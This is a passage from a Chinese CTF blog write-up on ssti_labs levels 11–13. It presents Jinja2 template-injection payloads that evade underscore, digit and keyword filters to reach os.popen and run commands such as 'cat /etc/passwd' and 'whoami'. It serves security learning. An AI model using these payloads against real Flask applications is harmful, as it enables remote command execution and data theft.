<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set cmd=dict(cmd=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)((req|attr(form)|attr(cmd)))|attr(read)()&#125;&#125;&amp;cmd=ls<br></code></pre></td></tr></table></figure>

<p>啥啥啥，又踩一个坑，<strong>这样传进去的是”request”字符串而根本不是request对象啊</strong>，那就去找request对象，运气不错，很快就找到了：</p>
<p><img src="/2023/02/09/ssti/image-20230802150900349.png"></p>
<p>重新构造，虽然内置request，也就是说可通过<code>&#123;&#123;request&#125;&#125;</code>访问，但是注意这里构造的”request”依旧是字符串;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>至此，最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802151957916.png"></p>
<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><img src="/2023/02/09/ssti/image-20230802152224096.png"></p>
<p>和11题差不了多少，就是下划线被过滤了，那url_for就用不了了，下划线用select获取，然后因为0-9被过滤了，用<code>length()</code>或者<code>count()</code>过滤器获取数字,试着从<code>&#123;&#123;request&#125;&#125;</code>溯源然后反过来利用request也没弄成功，不过问题不大，这题没有ban掉request，直接用</p>
<p>pyaload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set len=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join()|length()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set init=under~under~dict(init=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set subclasses=under~under~dict(subclasses=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=request|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;dict|attr(base)|attr(subclasses)()|attr(getitem)(len)|attr(init)|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure>

<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>我去。。。乍一看还有点吓人哈</p>
<p><img src="/2023/02/09/ssti/image-20230802172049912.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set cmd=dict(whoami=a)|join()%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;lipsum|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>这样已经可以getshell了，用lipsum很方便可以不用数字，但是shell命令不放在单独的一个请求参数里真的很难受。。。</p>
<p>试了很久，request被禁了，上一题意外发现url_for可以访问到request，但是这一题下划线又被禁了。。好家伙。下划线被禁了url_for也没法用，没错下划线被ban了是可以绕过，但是最后组成的也只是”url_for”这样一个字符串而已，并不是对象本身，那request和url_for都是全局对象，url_for能访问到request，然后就去找flask中别的全局对象，看看能不能用和上一题类似的方法访问到url_for或者request，都没成功。。作罢</p>
<p><code>&#123;&#123;lipsum.__globals__.__builtins__&#125;&#125;</code>里也有chr函数</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>SSTI</p><p><a href="http://example.com/2023/02/09/ssti/">http://example.com/2023/02/09/ssti/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-01-11</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/ssti/">ssti</a></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/wechatpay.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechatpay.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/SSRF/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SSRF</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="level-item">文件包含</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "f9aa3cb52730958dd3489016ff7af135",
            repo: "blog_comments",
            owner: "Potatowo233",
            clientID: "4cedddad9adafcd8f183",
            clientSecret: "06798c8bc59b39ef7319108c6f561d6d5615670c",
            admin: ["Potatowo233"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/head.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">This is Potato&#039;s blog~</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://space.bilibili.com/26346947" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/01/"><span class="level-start"><span class="level-item">一月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">十月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#SSTI"><span class="level-left"><span class="level-item">1</span><span class="level-item">SSTI</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#sources"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">sources:</span></span></a></li><li><a class="level is-mobile" href="#2023FCTF热身赛filechecker-mini"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">2023FCTF热身赛filechecker_mini</span></span></a></li><li><a class="level is-mobile" href="#ssti-labs"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">ssti_labs</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#level1"><span class="level-left"><span class="level-item">1.3.1</span><span class="level-item">level1</span></span></a></li><li><a class="level is-mobile" href="#level2"><span class="level-left"><span class="level-item">1.3.2</span><span class="level-item">level2</span></span></a></li><li><a class="level is-mobile" href="#level3"><span class="level-left"><span class="level-item">1.3.3</span><span class="level-item">level3</span></span></a></li><li><a class="level is-mobile" href="#level4"><span class="level-left"><span class="level-item">1.3.4</span><span class="level-item">level4</span></span></a></li><li><a class="level is-mobile" href="#level5"><span class="level-left"><span class="level-item">1.3.5</span><span class="level-item">level5</span></span></a></li><li><a class="level is-mobile" href="#level6"><span class="level-left"><span class="level-item">1.3.6</span><span class="level-item">level6</span></span></a></li><li><a class="level is-mobile" href="#level7"><span class="level-left"><span class="level-item">1.3.7</span><span class="level-item">level7</span></span></a></li><li><a class="level is-mobile" href="#level8"><span class="level-left"><span class="level-item">1.3.8</span><span class="level-item">level8</span></span></a></li><li><a class="level is-mobile" href="#level9"><span class="level-left"><span class="level-item">1.3.9</span><span class="level-item">level9</span></span></a></li><li><a class="level is-mobile" href="#level10"><span class="level-left"><span class="level-item">1.3.10</span><span class="level-item">level10</span></span></a></li><li><a class="level is-mobile" href="#level11"><span class="level-left"><span class="level-item">1.3.11</span><span class="level-item">level11</span></span></a></li><li><a class="level is-mobile" href="#level12"><span class="level-left"><span class="level-item">1.3.12</span><span class="level-item">level12</span></span></a></li><li><a class="level is-mobile" href="#level13"><span class="level-left"><span class="level-item">1.3.13</span><span class="level-item">level13</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">做题记录</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">学习记录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"><span class="level-start"><span class="level-item">Docker</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"><span class="level-start"><span class="level-item">渗透工具</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"><span class="level-start"><span class="level-item">自建靶场</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">常见漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">Web漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-07T04:46:48.000Z">2024-01-07</time></p><p class="title"><a href="/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/">Vim学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-01T08:06:34.000Z">2024-01-01</time></p><p class="title"><a href="/2024/01/01/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">PHP魔术方法</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:46:17.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/">CVE-2023-47130分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:19:30.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/">CVE-2023-41892分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-23T13:38:37.000Z">2023-12-23</time></p><p class="title"><a href="/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">记一次CMS代码审计</a></p></div></article></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Docker/"><span class="tag">Docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Misc/"><span class="tag">Misc</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqli/"><span class="tag">sqli</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span class="tag">正则表达式</span><span class="tag">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/title.png" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>